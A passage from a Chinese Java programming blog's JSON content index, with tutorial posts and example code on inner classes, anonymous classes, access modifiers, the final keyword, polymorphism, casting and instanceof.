那么这种情况下就可以省略掉该类的定义，而改为使用【匿名内部类】。 匿名内部类的定义格式： 123接口名称 对象名 = new 接口名称() &#123; // 覆盖重写所有抽象方法&#125;; 对格式“new 接口名称() {…}”进行解析： new代表创建对象的动作 接口名称就是匿名内部类需要实现哪个接口 {…}这才是匿名内部类的内容 另外还要注意几点问题： 匿名内部类，在【创建对象】的时候，只能使用唯一一次。 如果希望多次创建对象，而且类的内容一样的话，那么就需要使用单独定义的实现类了。 匿名对象，在【调用方法】的时候，只能调用唯一一次。 如果希望同一个对象，调用多次方法，那么必须给对象起个名字。 匿名内部类是省略了【实现类/子类名称】，但是匿名对象是省略了【对象名称】 强调：匿名内部类和匿名对象不是一回事！！！ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354package cn.itcast.day11.demo05;public class DemoMain &#123; public static void main(String[] args) &#123;// MyInterface obj = new MyInterfaceImpl();// obj.method();// MyInterface some = new MyInterface(); // 错误写法！ // 使用匿名内部类，但不是匿名对象，对象名称就叫objA MyInterface objA = new MyInterface() &#123; @Override public void method1() &#123; System.out.println(\"匿名内部类实现了方法！111-A\"); &#125; @Override public void method2() &#123; System.out.println(\"匿名内部类实现了方法！222-A\"); &#125; &#125;; objA.method1(); objA.method2(); System.out.println(\"=================\"); // 使用了匿名内部类，而且省略了对象名称，也是匿名对象 new MyInterface() &#123; @Override public void method1() &#123; System.out.println(\"匿名内部类实现了方法！111-B\"); &#125; @Override public void method2() &#123; System.out.println(\"匿名内部类实现了方法！222-B\"); &#125; &#125;.method1(); // 因为匿名对象无法调用第二次方法，所以需要再创建一个匿名内部类的匿名对象 new MyInterface() &#123; @Override public void method1() &#123; System.out.println(\"匿名内部类实现了方法！111-B\"); &#125; @Override public void method2() &#123; System.out.println(\"匿名内部类实现了方法！222-B\"); &#125; &#125;.method2(); &#125;&#125; 123456789package cn.itcast.day11.demo05;public interface MyInterface &#123; void method1(); // 抽象方法 void method2();&#125; 12345678910111213package cn.itcast.day11.demo05;public class MyInterfaceImpl implements MyInterface &#123; @Override public void method1() &#123; System.out.println(\"实现类覆盖重写了方法！111\"); &#125; @Override public void method2() &#123; System.out.println(\"实现类覆盖重写了方法！222\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java局部内部类的final问题","slug":"java00124局部内部类的final问题","date":"2020-03-13T13:12:18.000Z","updated":"2020-03-13T13:21:39.387Z","comments":true,"path":"2020/03/13/java00124局部内部类的final问题/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/13/java00124局部内部类的final问题/","excerpt":"","text":"java局部内部类的final问题 局部内部类，如果希望访问所在方法的局部变量，那么这个局部变量必须是【有效final的】。 备注： 从Java 8+开始，只要局部变量事实不变，那么final关键字可以省略。 原因： new出来的对象在堆内存当中。 局部变量是跟着方法走的，在栈内存当中。 方法运行结束之后，立刻出栈，局部变量就会立刻消失。 但是new出来的对象会在堆当中持续存在，直到垃圾回收消失。 12345678910111213141516package cn.itcast.day11.demo04;public class MyOuter &#123; public void methodOuter() &#123; int num = 10; // 所在方法的局部变量 class MyInner &#123; public void methodInner() &#123; System.out.println(num); &#125; &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java局部内部类定义","slug":"java00123局部内部类定义","date":"2020-03-12T14:58:22.000Z","updated":"2020-03-12T15:01:34.066Z","comments":true,"path":"2020/03/12/java00123局部内部类定义/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00123局部内部类定义/","excerpt":"","text":"java局部内部类定义 如果一个类是定义在一个方法内部的，那么这就是一个局部内部类。 “局部”：只有当前所属的方法才能使用它，出了这个方法外面就不能用了。 定义格式： 1234567修饰符 class 外部类名称 &#123; 修饰符 返回值类型 外部类方法名称(参数列表) &#123; class 局部内部类名称 &#123; // ... &#125; &#125;&#125; 小节一下类的权限修饰符： public &gt; protected &gt; (default) &gt; private 定义一个类的时候，权限修饰符规则： 外部类：public / (default) 成员内部类：public / protected / (default) / private 局部内部类：什么都不能写 123456789101112131415161718package cn.itcast.day11.demo04;class Outer &#123; public void methodOuter() &#123; class Inner &#123; // 局部内部类 int num = 10; public void methodInner() &#123; System.out.println(num); // 10 &#125; &#125; Inner inner = new Inner(); inner.methodInner(); &#125;&#125; 12345678910package cn.itcast.day11.demo04;public class DemoMain &#123; public static void main(String[] args) &#123; Outer obj = new Outer(); obj.methodOuter(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java内部类的同名变量访问","slug":"java00122内部类的同名变量访问","date":"2020-03-12T09:44:02.000Z","updated":"2020-03-12T14:57:39.341Z","comments":true,"path":"2020/03/12/java00122内部类的同名变量访问/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00122内部类的同名变量访问/","excerpt":"","text":"java内部类的同名变量访问 格式是： 外部类名称.this.外部类成员变量名 声明内部类对象: 外部类名称.内部类名称 对象名 = new 外部类名称().new 内部类名称(); 123456789101112131415161718192021package cn.itcast.day11.demo03;// 如果出现了重名现象，那么格式是：外部类名称.this.外部类成员变量名public class Outer &#123; int num = 10; // 外部类的成员变量 public class Inner /*extends Object*/ &#123; int num = 20; // 内部类的成员变量 public void methodInner() &#123; int num = 30; // 内部类方法的局部变量 System.out.println(num); // 局部变量，就近原则 System.out.println(this.num); // 内部类的成员变量 System.out.println(Outer.this.num); // 外部类的成员变量 &#125; &#125;&#125; 1234567891011package cn.itcast.day11.demo03;public class Demo02InnerClass &#123; public static void main(String[] args) &#123; // 外部类名称.内部类名称 对象名 = new 外部类名称().new 内部类名称(); Outer.Inner obj = new Outer().new Inner(); obj.methodInner(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java成员内部类的使用","slug":"java00121成员内部类的使用","date":"2020-03-12T09:36:26.000Z","updated":"2020-03-12T09:42:58.148Z","comments":true,"path":"2020/03/12/java00121成员内部类的使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00121成员内部类的使用/","excerpt":"","text":"java成员内部类的使用 如何使用成员内部类？ 有两种方式： 间接方式： 在外部类的方法当中，使用内部类；然后main只是调用外部类的方法。 直接方式，公式： 类名称 对象名 = new 类名称(); 【外部类名称.内部类名称 对象名 = new 外部类名称().new 内部类名称();】 1234567891011121314151617package cn.itcast.day11.demo03;public class Demo01InnerClass &#123; public static void main(String[] args) &#123; Body body = new Body(); // 外部类的对象 // 通过外部类的对象，调用外部类的方法，里面间接在使用内部类Heart body.methodBody(); System.out.println(\"=====================\"); // 按照公式写： Body.Hearts heart = new Body().new Heart(); heart.beat(); &#125;&#125; 12345678910111213141516171819202122232425262728293031package cn.itcast.day11.demo03;public class Body &#123; // 外部类 public class Heart &#123; // 成员内部类 // 内部类的方法 public void beat() &#123; System.out.println(\"心脏跳动：蹦蹦蹦！\"); System.out.println(\"我叫：\" + name); // 正确写法！ &#125; &#125; // 外部类的成员变量 private String name; // 外部类的方法 public void methodBody() &#123; System.out.println(\"外部类的方法\"); new Heart().beat(); &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java成员内部类的定义","slug":"java00120成员内部类的定义","date":"2020-03-12T09:33:33.000Z","updated":"2020-03-12T09:35:48.343Z","comments":true,"path":"2020/03/12/java00120成员内部类的定义/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00120成员内部类的定义/","excerpt":"","text":"java成员内部类的定义 成员内部类的定义格式： 12345678修饰符 class 外部类名称 &#123; 修饰符 class 内部类名称 &#123; // ... &#125; // ...&#125; 注意： 内用外，随意访问；外用内，需要内部类对象。 12345678910111213141516package cn.itcast.day11.demo03;public class Demo01InnerClass &#123; public static void main(String[] args) &#123; Body body = new Body(); // 外部类的对象 // 通过外部类的对象，调用外部类的方法，里面间接在使用内部类Heart body.methodBody(); System.out.println(\"=====================\"); // 按照公式写： Body.Heart heart = new Body().new Heart(); heart.beat(); &#125;&#125; 12345678910111213141516171819202122232425262728293031package cn.itcast.day11.demo03;public class Body &#123; // 外部类 public class Heart &#123; // 成员内部类 // 内部类的方法 public void beat() &#123; System.out.println(\"心脏跳动：蹦蹦蹦！\"); System.out.println(\"我叫：\" + name); // 正确写法！ &#125; &#125; // 外部类的成员变量 private String name; // 外部类的方法 public void methodBody() &#123; System.out.println(\"外部类的方法\"); new Heart().beat(); &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java内部类的概念与分类","slug":"java00119内部类的概念与分类","date":"2020-03-12T09:30:07.000Z","updated":"2020-03-12T09:32:54.484Z","comments":true,"path":"2020/03/12/java00119内部类的概念与分类/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00119内部类的概念与分类/","excerpt":"","text":"java内部类的概念与分类 如果一个事物的内部包含另一个事物，那么这就是一个类内部包含另一个类。 例如：身体和心脏的关系。又如：汽车和发动机的关系。 分类： 成员内部类 局部内部类（包含匿名内部类） 1234567package cn.itcast.day11.demo03;public class Demo01InnerClass &#123;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java四种权限修饰符","slug":"java00118四种权限修饰符","date":"2020-03-12T07:59:46.000Z","updated":"2020-03-12T09:29:42.197Z","comments":true,"path":"2020/03/12/java00118四种权限修饰符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00118四种权限修饰符/","excerpt":"","text":"java四种权限修饰符 Java中有四种权限修饰符： public &gt; protected &gt; (default) &gt; private 同一个类（我自己） YES YES YES YES 同一个包（我邻居） YES YES YES NO 不同包子类（我儿子） YES YES NO NO 不同包非子类（陌生人） YES NO NO NO 注意事项： (default)并不是关键字“default”，而是根本不写。 sub包中的类 1234567891011package cn.itcast.day11.demo02.sub;import cn.itcast.day11.demo02.MyClass;public class Stranger &#123; public void methodStrange() &#123; System.out.println(new MyClass().num); &#125;&#125; 123456789101112package cn.itcast.day11.demo02.sub;import cn.itcast.day11.demo02.MyClass;public class MySon extends MyClass &#123; public void methodSon() &#123;// System.out.println(super.num); &#125;&#125; demo02包中的类 1234567891011package cn.itcast.day11.demo02;public class MyClass &#123; public int num = 10; public void method() &#123; System.out.println(num); &#125;&#125; 12345package cn.itcast.day11.demo02;public class Demo01Main &#123;&#125; 123456789package cn.itcast.day11.demo02;public class MyAnother &#123; public void anotherMethod() &#123;// System.out.println(new MyClass().num); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java final关键字用于修饰成员变量","slug":"java00117final关键字用于修饰成员变量","date":"2020-03-12T07:54:37.000Z","updated":"2020-03-12T07:57:43.442Z","comments":true,"path":"2020/03/12/java00117final关键字用于修饰成员变量/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00117final关键字用于修饰成员变量/","excerpt":"","text":"java final关键字用于修饰成员变量 对于成员变量来说，如果使用final关键字修饰，那么这个变量也照样是不可变。 由于成员变量具有默认值，所以用了final之后必须手动赋值，不会再给默认值了。 对于final的成员变量，要么使用直接赋值，要么通过构造方法赋值。二者选其一。 必须保证类当中所有重载的构造方法，都最终会对final的成员变量进行赋值。 12345678910111213141516171819202122package cn.itcast.day11.demo01;public class Person &#123; private final String name/* = \"鹿晗\"*/; public Person() &#123; name = \"关晓彤\"; &#125; public Person(String name) &#123; this.name = name; &#125; public String getName() &#123; return name; &#125;// public void setName(String name) &#123;// this.name = name;// &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java final关键字用于修饰局部变量","slug":"java00116final关键字用于修饰局部变量","date":"2020-03-12T07:50:56.000Z","updated":"2020-03-12T07:54:01.844Z","comments":true,"path":"2020/03/12/java00116final关键字用于修饰局部变量/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00116final关键字用于修饰局部变量/","excerpt":"","text":"java final关键字用于修饰局部变量 对于基本类型来说，不可变说的是变量当中的数据不可改变 对于引用类型来说，不可变说的是变量当中的地址值不可改变 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950package cn.itcast.day11.demo01;/*final关键字代表最终、不可改变的。常见四种用法：1. 可以用来修饰一个类2. 可以用来修饰一个方法3. 还可以用来修饰一个局部变量4. 还可以用来修饰一个成员变量 */public class Demo01Final &#123; public static void main(String[] args) &#123; int num1 = 10; System.out.println(num1); // 10 num1 = 20; System.out.println(num1); // 20 // 一旦使用final用来修饰局部变量，那么这个变量就不能进行更改。 // “一次赋值，终生不变” final int num2 = 200; System.out.println(num2); // 200// num2 = 250; // 错误写法！不能改变！// num2 = 200; // 错误写法！ // 正确写法！只要保证有唯一一次赋值即可 final int num3; num3 = 30; // 对于基本类型来说，不可变说的是变量当中的数据不可改变 // 对于引用类型来说，不可变说的是变量当中的地址值不可改变 Student stu1 = new Student(\"赵丽颖\"); System.out.println(stu1); System.out.println(stu1.getName()); // 赵丽颖 stu1 = new Student(\"霍建华\"); System.out.println(stu1); System.out.println(stu1.getName()); // 霍建华 System.out.println(\"===============\"); final Student stu2 = new Student(\"高圆圆\"); // 错误写法！final的引用类型变量，其中的地址不可改变// stu2 = new Student(\"赵又廷\"); System.out.println(stu2.getName()); // 高圆圆 stu2.setName(\"高圆圆圆圆圆圆\"); System.out.println(stu2.getName()); // 高圆圆圆圆圆圆 &#125;&#125; 123456789101112131415161718192021package cn.itcast.day11.demo01;public class Student &#123; private String name; public Student() &#123; &#125; public Student(String name) &#123; this.name = name; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java final关键字用于修饰成员方法","slug":"java00115final关键字用于修饰成员方法","date":"2020-03-12T07:38:55.000Z","updated":"2020-03-12T07:42:07.282Z","comments":true,"path":"2020/03/12/java00115final关键字用于修饰成员方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00115final关键字用于修饰成员方法/","excerpt":"","text":"java final关键字用于修饰成员方法 当final关键字用来修饰一个方法的时候，这个方法就是最终方法，也就是不能被覆盖重写。 格式： 123修饰符 final 返回值类型 方法名称(参数列表) &#123; // 方法体&#125; 注意事项： 对于类、方法来说，abstract关键字和final关键字不能同时使用，因为矛盾。 123456789101112package cn.itcast.day11.demo01;public abstract class Fu &#123; public final void method() &#123; System.out.println(\"父类方法执行！\"); &#125; public abstract /*final*/ void methodAbs() ;&#125; 1234567891011121314package cn.itcast.day11.demo01;public class Zi extends Fu &#123; @Override public void methodAbs() &#123; &#125; // 错误写法！不能覆盖重写父类当中final的方法// @Override// public void method() &#123;// System.out.println(\"子类覆盖重写父类的方法！\");// &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java final关键字用于修饰类","slug":"java00114final关键字用于修饰类","date":"2020-03-12T07:31:37.000Z","updated":"2020-03-12T07:35:31.308Z","comments":true,"path":"2020/03/12/java00114final关键字用于修饰类/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00114final关键字用于修饰类/","excerpt":"","text":"java final关键字用于修饰类 当final关键字用来修饰一个类的时候， 格式： 123public final class 类名称 &#123; // ...&#125; 含义： 当前这个类不能有任何的子类。（太监类） 注意： 一个类如果是final的，那么其中所有的成员方法都无法进行覆盖重写（因为没儿子。） 123456789package cn.itcast.day11.demo01;public final class MyClass /*extends Object*/ &#123; public void method() &#123; System.out.println(\"方法执行！\"); &#125;&#125; 12345package cn.itcast.day11.demo01;// 不能使用一个final类来作为父类public class MySubClass /*extends MyClass*/ &#123;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java final关键字与四种用法","slug":"java00113final关键字与四种用法","date":"2020-03-12T07:26:50.000Z","updated":"2020-03-12T07:31:02.653Z","comments":true,"path":"2020/03/12/java00113final关键字与四种用法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00113final关键字与四种用法/","excerpt":"","text":"java final关键字与四种用法 final关键字代表最终、不可改变的。 常见四种用法： 可以用来修饰一个类 可以用来修饰一个方法 还可以用来修饰一个局部变量 还可以用来修饰一个成员变量","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java关键字读法","slug":"java00112关键字读法","date":"2020-03-11T14:51:47.000Z","updated":"2020-03-11T14:59:57.864Z","comments":true,"path":"2020/03/11/java00112关键字读法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00112关键字读法/","excerpt":"","text":"java关键字读法","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口多态","slug":"java00111接口多态","date":"2020-03-11T11:36:49.000Z","updated":"2020-03-11T11:46:56.254Z","comments":true,"path":"2020/03/11/java00111接口多态/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00111接口多态/","excerpt":"","text":"java接口多态 接口多态和类多态是一样的用法 定义格式: 123456789public interface 父接口&#123; //内容&#125;public class 类名A implements 父接口 &#123; //内容&#125;public class 类名B implements 父接口 &#123; //内容&#125; 使用格式: 父接口类型 接口对象名 = new 类名(); 1234567891011package xiaochenyan.top.demo003;public class DemoMain&#123; public static void main(String[] args) &#123; Computer cm = new Computer(); cm.open(); cm.local(new usbMouse()); cm.local(new usbKeyboard()); cm.close(); &#125;&#125; 123456package xiaochenyan.top.demo003;public interface USB&#123; public abstract void open(); public abstract void close();&#125; 12345678910111213141516package xiaochenyan.top.demo003;public class usbKeyboard implements USB&#123; @Override public void open() &#123; System.out.println(\"打开键盘\"); &#125; @Override public void close() &#123; System.out.println(\"关闭键盘\"); &#125; public void qiaoJiJianPan()&#123; System.out.println(\"敲击键盘\"); &#125;&#125; 12345678910111213141516package xiaochenyan.top.demo003;public class usbMouse implements USB&#123; @Override public void open() &#123; System.out.println(\"打开鼠标\"); &#125; @Override public void close() &#123; System.out.println(\"关闭鼠标\"); &#125; public void shuBiaoDianJi()&#123; System.out.println(\"鼠标点击\"); &#125;&#125; 123456789101112131415161718192021222324252627package xiaochenyan.top.demo003;public class Computer&#123; public void open()&#123; System.out.println(\"打开电脑\"); &#125; public void close()&#123; System.out.println(\"关闭电脑\"); &#125; //使用接口进行多态处理 public void local(USB obj) &#123; obj.open(); if(obj instanceof usbMouse)&#123; ((usbMouse) obj).shuBiaoDianJi(); &#125;else if(obj instanceof usbKeyboard)&#123; ((usbKeyboard) obj).qiaoJiJianPan(); &#125; obj.close(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java用instanceof关键字进行类型判断","slug":"java00109用instanceof关键字进行类型判断","date":"2020-03-11T09:15:30.000Z","updated":"2020-03-11T09:21:06.904Z","comments":true,"path":"2020/03/11/java00109用instanceof关键字进行类型判断/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00109用instanceof关键字进行类型判断/","excerpt":"","text":"java用instanceof关键字进行类型判断 如何才能知道一个父类引用的对象，本来是什么子类？ 格式： 对象 instanceof 类名称 这将会得到一个boolean值结果，也就是判断前面的对象能不能当做后面类型的实例。 1234567package cn.itcast.day10.demo06;public abstract class Animal &#123; public abstract void eat();&#125; 12345678910111213package cn.itcast.day10.demo06;public class Cat extends Animal &#123; @Override public void eat() &#123; System.out.println(\"猫吃鱼\"); &#125; // 子类特有方法 public void catchMouse() &#123; System.out.println(\"猫抓老鼠\"); &#125;&#125; 123456789101112package cn.itcast.day10.demo06;public class Dog extends Animal &#123; @Override public void eat() &#123; System.out.println(\"狗吃SHIT\"); &#125; public void watchHouse() &#123; System.out.println(\"狗看家\"); &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435package cn.itcast.day10.demo06;public class Demo02Instanceof &#123; public static void main(String[] args) &#123; Animal animal = new Dog(); // 本来是一只狗 animal.eat(); // 狗吃SHIT // 如果希望掉用子类特有方法，需要向下转型 // 判断一下父类引用animal本来是不是Dog if (animal instanceof Dog) &#123; Dog dog = (Dog) animal; dog.watchHouse(); &#125; // 判断一下animal本来是不是Cat if (animal instanceof Cat) &#123; Cat cat = (Cat) animal; cat.catchMouse(); &#125; giveMeAPet(new Dog()); &#125; public static void giveMeAPet(Animal animal) &#123; if (animal instanceof Dog) &#123; Dog dog = (Dog) animal; dog.watchHouse(); &#125; if (animal instanceof Cat) &#123; Cat cat = (Cat) animal; cat.catchMouse(); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java对象的向下转型","slug":"java00108对象的向下转型","date":"2020-03-11T08:57:49.000Z","updated":"2020-03-11T09:19:41.252Z","comments":true,"path":"2020/03/11/java00108对象的向下转型/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00108对象的向下转型/","excerpt":"","text":"java对象的向下转型 向上转型一定是安全的，没有问题的，正确的。但是也有一个弊端： 对象一旦向上转型为父类，那么就无法调用子类原本特有的内容。 解决方案：用对象的向下转型【还原】。 格式 : 子类类型 子类对象名 = (子类类型)父类对象 1234567package cn.itcast.day10.demo06;public abstract class Animal &#123; public abstract void eat();&#125; 12345678910111213package cn.itcast.day10.demo06;public class Cat extends Animal &#123; @Override public void eat() &#123; System.out.println(\"猫吃鱼\"); &#125; // 子类特有方法 public void catchMouse() &#123; System.out.println(\"猫抓老鼠\"); &#125;&#125; 123456789101112package cn.itcast.day10.demo06;public class Dog extends Animal &#123; @Override public void eat() &#123; System.out.println(\"狗吃SHIT\"); &#125; public void watchHouse() &#123; System.out.println(\"狗看家\"); &#125;&#125; 123456789101112131415161718192021222324package cn.itcast.day10.demo06;public class Demo01Main &#123; public static void main(String[] args) &#123; // 对象的向上转型，就是：父类引用指向之类对象。 Animal animal = new Cat(); // 本来创建的时候是一只猫 animal.eat(); // 猫吃鱼// animal.catchMouse(); // 错误写法！ // 向下转型，进行“还原”动作 Cat cat = (Cat) animal; cat.catchMouse(); // 猫抓老鼠 // 下面是错误的向下转型 // 本来new的时候是一只猫，现在非要当做狗 // 错误写法！编译不会报错，但是运行会出现异常： // java.lang.ClassCastException，类转换异常 Dog dog = (Dog) animal; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java对象的向上转型","slug":"java00107对象的向上转型","date":"2020-03-11T08:44:08.000Z","updated":"2020-06-10T11:26:37.164Z","comments":true,"path":"2020/03/11/java00107对象的向上转型/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00107对象的向上转型/","excerpt":"","text":"java对象的向上转型 1234567package cn.itcast.day10.demo06;public abstract class Animal &#123; public abstract void eat();&#125; 12345678910111213package cn.itcast.day10.demo06;public class Cat extends Animal &#123; @Override public void eat() &#123; System.out.println(\"猫吃鱼\"); &#125; // 子类特有方法 public void catchMouse() &#123; System.out.println(\"猫抓老鼠\"); &#125;&#125; 1234567891011121314package cn.itcast.day10.demo06; */public class Demo01Main &#123; public static void main(String[] args) &#123; // 对象的向上转型，就是：父类引用指向子类对象。 Animal animal = new Cat(); animal.eat(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java使用多态的好处","slug":"java00106使用多态的好处","date":"2020-03-11T08:29:46.000Z","updated":"2020-03-11T08:43:15.011Z","comments":true,"path":"2020/03/11/java00106使用多态的好处/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00106使用多态的好处/","excerpt":"","text":"java使用多态的好处","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java多态中成员方法的使用特点","slug":"java00105多态中成员方法的使用特点","date":"2020-03-11T08:29:41.000Z","updated":"2020-03-11T11:33:06.491Z","comments":true,"path":"2020/03/11/java00105多态中成员方法的使用特点/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00105多态中成员方法的使用特点/","excerpt":"","text":"java多态中成员方法的使用特点 在多态的代码当中，成员方法的访问规则是： ​ 看new的是谁，就优先用谁，没有则向上找。 口诀： 编译看左边，运行看右边。 对比一下： 成员变量： 编译看左边，运行还看左边。 成员方法： 编译看左边，运行看右边。 12345678910111213141516package cn.itcast.day10.demo05;public class Demo02MultiMethod &#123; public static void main(String[] args) &#123; Fu obj = new Zi(); // 多态 obj.method(); // 父子都有，优先用子 obj.methodFu(); // 子类没有，父类有，向上找到父类 // 编译看左边，左边是Fu，Fu当中没有methodZi方法，所以编译报错。// obj.methodZi(); // 错误写法！ &#125;&#125; 12345678910111213141516171819package cn.itcast.day10.demo05;public class Fu /*extends Object*/ &#123; int num = 10; public void showNum() &#123; System.out.println(num); &#125; public void method() &#123; System.out.println(\"父类方法\"); &#125; public void methodFu() &#123; System.out.println(\"父类特有方法\"); &#125;&#125; 12345678910111213141516171819202122package cn.itcast.day10.demo05;public class Zi extends Fu &#123; int num = 20; int age = 16; @Override public void showNum() &#123; System.out.println(num); &#125; @Override public void method() &#123; System.out.println(\"子类方法\"); &#125; public void methodZi() &#123; System.out.println(\"子类特有方法\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java多态中成员变量的使用特点","slug":"java00104多态中成员变量的使用特点","date":"2020-03-11T08:14:50.000Z","updated":"2020-03-11T08:22:24.544Z","comments":true,"path":"2020/03/11/java00104多态中成员变量的使用特点/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00104多态中成员变量的使用特点/","excerpt":"","text":"java多态中成员变量的使用特点 访问成员变量的两种方式： 直接通过对象名称访问成员变量：看等号左边是谁，优先用谁，没有则向上找。 间接通过成员方法访问成员变量：看该方法属于谁，优先用谁，没有则向上找。 123456789101112131415161718package cn.itcast.day10.demo05;public class Demo01MultiField &#123; public static void main(String[] args) &#123; // 使用多态的写法，父类引用指向子类对象 Fu obj = new Zi(); System.out.println(obj.num); // 父：10// System.out.println(obj.age); // 错误写法！ System.out.println(\"=============\"); // 子类没有覆盖重写，就是父：10 // 子类如果覆盖重写，就是子：20 obj.showNum(); &#125;&#125; 12345678910111213141516171819package cn.itcast.day10.demo05;public class Fu /*extends Object*/ &#123; int num = 10; public void showNum() &#123; System.out.println(num); &#125; public void method() &#123; System.out.println(\"父类方法\"); &#125; public void methodFu() &#123; System.out.println(\"父类特有方法\"); &#125;&#125; 12345678910111213141516171819202122package cn.itcast.day10.demo05;public class Zi extends Fu &#123; int num = 20; int age = 16; @Override public void showNum() &#123; System.out.println(num); &#125; @Override public void method() &#123; System.out.println(\"子类方法\"); &#125; public void methodZi() &#123; System.out.println(\"子类特有方法\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java多态的格式与使用","slug":"java00103多态的格式与使用","date":"2020-03-11T08:09:47.000Z","updated":"2020-03-11T08:14:13.229Z","comments":true,"path":"2020/03/11/java00103多态的格式与使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00103多态的格式与使用/","excerpt":"","text":"java多态的格式与使用 代码当中体现多态性，其实就是一句话：父类引用指向子类对象。 格式： 父类名称 对象名 = new 子类名称(); 或者： 接口名称 对象名 = new 实现类名称(); 12345678910111213package cn.itcast.day10.demo04;public class Demo01Multi &#123; public static void main(String[] args) &#123; // 使用多态的写法 // 左侧父类的引用，指向了右侧子类的对象 Fu obj = new Zi(); obj.method(); obj.methodFu(); &#125;&#125; 12345678910111213package cn.itcast.day10.demo04;public class Fu &#123; public void method() &#123; System.out.println(\"父类方法\"); &#125; public void methodFu() &#123; System.out.println(\"父类特有方法\"); &#125;&#125; 123456789package cn.itcast.day10.demo04;public class Zi extends Fu &#123; @Override public void method() &#123; System.out.println(\"子类方法\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java多态的概述","slug":"java00102多态的概述","date":"2020-03-11T08:06:25.000Z","updated":"2020-03-11T08:09:14.206Z","comments":true,"path":"2020/03/11/java00102多态的概述/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00102多态的概述/","excerpt":"","text":"java多态的概述","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口之间的多继承","slug":"java00110接口之间的多继承","date":"2020-03-11T07:57:13.000Z","updated":"2020-03-11T08:05:01.673Z","comments":true,"path":"2020/03/11/java00110接口之间的多继承/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00110接口之间的多继承/","excerpt":"","text":"java接口之间的多继承 类与类之间是单继承的。直接父类只有一个。 类与接口之间是多实现的。一个类可以实现多个接口。 接口与接口之间是多继承的。 注意事项： 多个父接口当中的抽象方法如果重复，没关系。 